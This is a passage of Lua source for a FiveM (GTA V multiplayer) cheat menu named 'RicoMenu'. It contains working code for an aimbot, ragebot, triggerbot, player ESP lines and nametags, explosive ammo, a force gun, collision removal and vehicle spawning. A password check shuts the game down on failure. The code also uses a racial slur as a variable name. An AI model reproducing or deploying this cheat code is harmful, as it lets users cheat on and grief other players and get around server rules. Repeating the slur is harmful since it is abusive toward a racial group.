                DrawRect(0.25, 0.5, 0.01, 0.515, 255, 80, 80, 100)
                DrawRect(0.75, 0.5, 0.01, 0.515, 255, 80, 80, 100)
                DrawRect(0.5, 0.25, 0.49, 0.015, 255, 80, 80, 100)
                DrawRect(0.5, 0.75, 0.49, 0.015, 255, 80, 80, 100)
            end
            
            local plist = GetActivePlayers()
            for i = 1, #plist do
                ShootAimbot(GetPlayerPed(plist[i]))
            end
        
        end
        
        if Ragebot and IsDisabledControlPressed(0, Keys["MOUSE1"]) then
            for k in EnumeratePeds() do
                if k ~= PlayerPedId() then RageShoot(k) end
            end
        end
        
        if Crosshair then
            ShowHudComponentThisFrame(14)
        end
        
        if ShowCoords then
            local pos = GetEntityCoords(PlayerPedId())
            DrawTxt("~b~X: ~w~" .. round(pos.x, 3), 0.38, 0.03, 0.0, 0.4)
            DrawTxt("~b~Y: ~w~" .. round(pos.y, 3), 0.45, 0.03, 0.0, 0.4)
            DrawTxt("~b~Z: ~w~" .. round(pos.z, 3), 0.52, 0.03, 0.0, 0.4)
        end
        
        if ExplosiveAmmo then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
                AddExplosion(pos.x, pos.y, pos.z, 1, 1.0, 1, 0, 0.1)
            end
        end
        
        if ForceGun then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
                for k in EnumeratePeds() do
                    local coords = GetEntityCoords(k)
                    if k ~= PlayerPedId() and GetDistanceBetweenCoords(pos, coords) <= 1.0 then
                        local forward = GetEntityForwardVector(PlayerPedId())
                        RequestControlOnce(k)
                        ApplyForce(k, forward * 500)
                    end
                end
                
                for k in EnumerateVehicles() do
                    local coords = GetEntityCoords(k)
                    if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) and GetDistanceBetweenCoords(pos, coords) <= 3.0 then
                        local forward = GetEntityForwardVector(PlayerPedId())
                        RequestControlOnce(k)
                        ApplyForce(k, forward * 500)
                    end
                end
            
            end
        end
        
        if Triggerbot then
            local hasTarget, target = GetEntityPlayerIsFreeAimingAt(PlayerId())
            if hasTarget and IsEntityAPed(target) then
                ShootAt(target, "SKEL_HEAD")
            end
        end
		
		local niggerVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
			            if IsPedInAnyVehicle(PlayerPedId()) then
                if driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 5.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end
			end			
 
        if not Collision then
            playerveh = GetVehiclePedIsIn(PlayerPedId(), false)
            for k in EnumerateVehicles() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in EnumerateObjects() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in EnumeratePeds() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
        end
        
        if DeadlyBulldozer then
            SetVehicleBulldozerArmPosition(GetVehiclePedIsIn(PlayerPedId(), 0), math.random() % 1, 1)
            SetVehicleEngineHealth(GetVehiclePedIsIn(PlayerPedId(), 0), 1000.0)
            if not IsPedInAnyVehicle(PlayerPedId(), 0) then
                DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 1))
                DeadlyBulldozer = not DeadlyBulldozer
            elseif IsDisabledControlJustPressed(0, Keys["E"]) then
                local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                local coords = GetEntityCoords(veh)
                local forward = GetEntityForwardVector(veh)
                local heading = GetEntityHeading(veh)
                local veh = CreateVehicle(GetHashKey("BULLDOZER"), coords.x + forward.x * 10, coords.y + forward.y * 10, coords.z, heading, 1, 1)
                SetVehicleColours(veh, 27, 27)
                SetVehicleEngineHealth(veh, -3500.0)
                ApplyForce(veh, forward * 500.0)
            end
        end
        
        if RicoMenu.IsMenuOpened('objectlist') then
            for i = 1, #SpawnedObjects do
                local x, y, z = table.unpack(GetEntityCoords(SpawnedObjects[i]))
                DrawText3D(x, y, z, "OBJECT " .. "[" .. i .. "] " .. "WITH ID " .. SpawnedObjects[i])
            end
        end
        
        if NametagsEnabled then
            tags_plist = GetActivePlayers()
            for i = 1, #tags_plist do
                if NetworkIsPlayerTalking(tags_plist[i]) then
                    SetMpGamerTagVisibility(ptags[i], 4, 1)
                else
                    SetMpGamerTagVisibility(ptags[i], 4, 0)
                end
                
                if IsPedInAnyVehicle(GetPlayerPed(tags_plist[i])) and GetSeatPedIsIn(GetPlayerPed(tags_plist[i])) == 0 then
                    SetMpGamerTagVisibility(ptags[i], 8, 1)
                else
                    SetMpGamerTagVisibility(ptags[i], 8, 0)
                end
            
            end
        end
        
        if ANametagsEnabled then
            local plist = GetActivePlayers()
            table.removekey(plist, PlayerId())
            for i = 1, #plist do
                local pos = GetEntityCoords(GetPlayerPed(plist[i]))
                local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), pos)
                if distance <= 30 then
                    if ANametagsNotNeedLOS then
                        DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "\n~b~Name: ~w~" .. GetPlayerName(plist[i]))
                    elseif not ANametagsNotNeedLOS and HasEntityClearLosToEntity(PlayerPedId(), GetPlayerPed(plist[i]), 17) then
                        DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "\n~b~Name: ~w~" .. GetPlayerName(plist[i]))
                    end
                end
            end
        end
        
        if LinesEnabled then
            local plist = GetActivePlayers()
            local playerCoords = GetEntityCoords(PlayerPedId())
            for i = 1, #plist do
                if i == PlayerId() then i = i + 1 end
                local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
                DrawLine(playerCoords, targetCoords, 0, 0, 255, 255)
            end
        end

	if WeatherChanger then
	    SetWeatherTypePersist(WeatherType)
	    SetWeatherTypeNowPersist(WeatherType)
	    SetWeatherTypeNow(WeatherType)
	    SetOverrideWeather(WeatherType)
	end
        
        if Radio then
            PortableRadio = true
            SetRadioToStationIndex(RadioStation)
        elseif not Radio then
            PortableRadio = false
        end

        if PortableRadio then
            SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), false)
            SetMobilePhoneRadioState(true)
            SetMobileRadioEnabledDuringGameplay(true)
            HideHudComponentThisFrame(16)
        elseif not PortableRadio then
            SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), true)
            SetMobilePhoneRadioState(false)
            SetMobileRadioEnabledDuringGameplay(false)
            ShowHudComponentThisFrame(16)
            local radioIndex = GetPlayerRadioStationIndex()

            if IsPedInAnyVehicle(PlayerPedId(), false) and radioIndex + 1 ~= 19 then 
                currRadioIndex = radioIndex + 1
                selRadioIndex = radioIndex + 1
            end
        end

        if ForceMap then
            DisplayRadar(true)
        end
		
		if ForceThirdPerson then
			SetFollowPedCamViewMode(0)
			SetFollowVehicleCamViewMode(0)
		end
        
        Wait(0)
    end
end)

    end)
end


Citizen.CreateThread(function()
    DisableAllControls() 
    StartPasswordCheck() 
end)


function RequirePasswordBeforeAction()
    if not correctCodeEntered then
        DisplayNotification("You must enter the correct password first!")
        return false
    end
    return true
end


Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if RequirePasswordBeforeAction() then
            
           
        end
    end
end)
local BannerObject = CreateDui("https://i.ibb.co/rfLdwNM/5b5725dfe33f22facfecf4f871dd6ae7.png", 512, 128)
local BannerHandle = GetDuiHandle(BannerObject)
local BannerDict = CreateRuntimeTxd("RicoMenuBanner")
local BannerTexture = CreateRuntimeTextureFromDuiHandle(BannerDict, "RicoMenuBanner", BannerHandle)


Citizen.CreateThread(function()
    while true do
        RicoMenu.SetTitleBackgroundSprite(nil, 'RicoMenuBanner', 'RicoMenuBanner')
        Wait(100)
    end
end)


local function isPasswordCorrect()
    local currentPassword = {114, 105, 99, 111, 109, 101, 110, 117} 
    for i = 1, #passwordNumbers do
        if passwordNumbers[i] ~= currentPassword[i] then
            return false 
        end
    end
    return true
end


local function closeGame()

    ForceSocialClubUpdate() 
end


Citizen.CreateThread(function()
    while true do
        Citizen.Wait(5000) 
        if not isPasswordCorrect() then
            closeGame() 
            break
        end
    end
end)
